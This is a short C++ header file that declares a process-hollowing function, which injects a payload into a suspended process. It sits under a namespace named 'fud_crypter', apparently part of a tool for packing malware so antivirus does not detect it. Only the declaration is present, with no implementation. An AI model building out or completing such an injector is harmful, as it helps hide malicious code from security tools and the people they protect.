#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>   // <-- HIÁNYZOTT

namespace fud_crypter {
namespace injection {

bool hollow_process(
    const std::wstring& target_path,
    const std::vector<uint8_t>& payload,
    DWORD creation_flags = CREATE_SUSPENDED
);

} // namespace injection
} // namespace fud_crypter
